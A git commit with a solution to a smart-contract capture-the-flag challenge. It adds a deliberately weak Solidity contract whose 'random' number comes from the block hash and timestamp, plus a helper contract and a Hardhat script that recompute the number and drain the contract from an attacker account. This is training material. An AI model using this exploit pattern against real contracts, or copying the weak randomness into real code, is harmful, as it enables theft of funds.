f0509a5cce2c1a27b447609c5e5315041e0204c1
conache <C.conache@gmail.com>
2023-02-27 21:48:30 +0200

    Guess the random number solution

---
+++ contracts/5-guess-the-random-number/GuessTheRandomNumber.sol
@@ -0,0 +1,33 @@
+pragma solidity 0.4.21;
+
+contract GuessTheRandomNumberChallenge {
+    // todo: remove this
+    uint8 public answer;
+
+    function GuessTheRandomNumberChallenge() public payable {
+        require(msg.value == 1 ether);
+        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function guess(uint8 n) public payable {
+        require(msg.value == 1 ether);
+
+        if (n == answer) {
+            msg.sender.transfer(2 ether);
+        }
+    }
+}
+
+contract GuessTheRandomNumberChallengeHack {
+    function getAnswer(uint256 blockNumber, uint256 tstmp)
+        public
+        pure
+        returns (uint8)
+    {
+        return uint8(keccak256(blockNumber, tstmp));
+    }
+}
---
+++ scripts/5-guess-the-random-number.js
@@ -0,0 +1,26 @@
+const { ethers } = require("hardhat");
+
+async function main() {
+  const [deployer, attacker] = await hre.ethers.getSigners();
+  const GuessTheRandomNumberContract = await ethers.getContractFactory("GuessTheRandomNumberChallenge", deployer);
+  const GuessTheRandomNumberContractHack = await ethers.getContractFactory("GuessTheRandomNumberChallengeHack", deployer);
+
+  const mainContract = await GuessTheRandomNumberContract.deploy({ value: ethers.utils.parseEther("1") });
+  const hackContract = await GuessTheRandomNumberContractHack.deploy();
+
+  const blockBefore = await ethers.provider.getBlock(mainContract.deployTransaction.blockNumber - 1);
+  const currentBlock = await ethers.provider.getBlock(mainContract.deployTransaction.blockNumber);
+  const timestamp = currentBlock.timestamp;
+
+  const val = await hackContract.getAnswer(blockBefore.hash, timestamp);
+  await mainContract.connect(attacker).guess(val, { value: ethers.utils.parseEther("1.0") });
+}
+
+// We recommend this pattern to be able to use async/await everywhere
+// and properly handle errors.
+main()
+  .then(() => process.exit(0))
+  .catch((error) => {
+    console.error(error);
+    process.exit(1);
+  });
